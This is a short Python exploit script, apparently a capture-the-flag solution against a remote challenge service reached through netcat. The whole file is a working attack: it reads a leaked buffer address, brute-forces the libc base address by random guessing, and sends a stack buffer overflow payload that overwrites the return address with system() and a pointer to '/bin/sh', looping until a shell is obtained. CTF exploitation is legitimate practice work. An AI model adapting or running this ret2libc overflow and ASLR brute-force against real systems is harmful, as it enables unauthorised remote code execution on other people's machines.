import os
import sys
import random
import struct
import subprocess

from subprocess import *

# Offset for hack.sydney.
system_offset_remote = 0x0003fcd0

# Offsets for local computers.
system_offset_desktop = 0x00040190
system_offset_laptop = 0x0003aeb0

system_offset = system_offset_remote

# Address template for libc base.
libc_template = [0xf, 0x7, None, None, 0x4, 0x0, 0x0, 0x0]

program = ["/bin/nc", "9447.hack.sydney", "9002", "-q", "-1"]
#program = "./nxbuf"

INT_MAX = 4294967295

def guess_addr(template):
    addr = 0
    for (i, x) in enumerate(template):
        if x is None:
            y = random.randint(0, 15)
        else:
            y = x

        addr += y << (28 - 4*i)

    if addr + system_offset <= INT_MAX:
        return addr
    else:
        return guess_addr(template)

def exploit(libc_guess, buf_addr, output=sys.stdout):
    # A's to clobber the buffer and the stack.
    exploit = b"A" * 9443

    # Junk to cover the old ebp.
    exploit += b"BBBB"

    # Address of system to overwrite return address.
    exploit += struct.pack("<I", libc_guess + system_offset)

    # Stack pop? Misc junk? Not sure why this is needed?
    exploit += b"CCCC"

    # Pointer to a /bin/sh string.
    bin_sh_addr = struct.pack("<I", buf_addr + 9447 + 12)
    #print(bin_sh_addr, file=sys.stderr)
    exploit += bin_sh_addr

    # Shell string itself.
    exploit += b"/bin/sh\x00\n"

    output.write(exploit)
    output.flush()

def main():
    while True:
        p = Popen(program, stdin=PIPE, stdout=PIPE)

        # Read junk line.
        p.stdout.readline()

        # Read buffer address
        buf_line = p.stdout.readline()
        buf_addr = int(buf_line[len("bufaddr: "):], 16)
        print("~ buffer address is %x" % buf_addr)

        # Guess libc base address.
        libc_guess = guess_addr(libc_template)
        print("~ libc guess is %x\n" % libc_guess)

        # Write exploit.
        exploit(libc_guess, buf_addr, output=p.stdin)

        try:
            p.wait(timeout=1)
        except subprocess.TimeoutExpired:
            print("OMG popped a shell! PID: %d" % p.pid)
            print("Go and muck around in /proc/%d/fd as root ;)" % p.pid)
            while True:
                pass

if __name__ == "__main__":
    main()
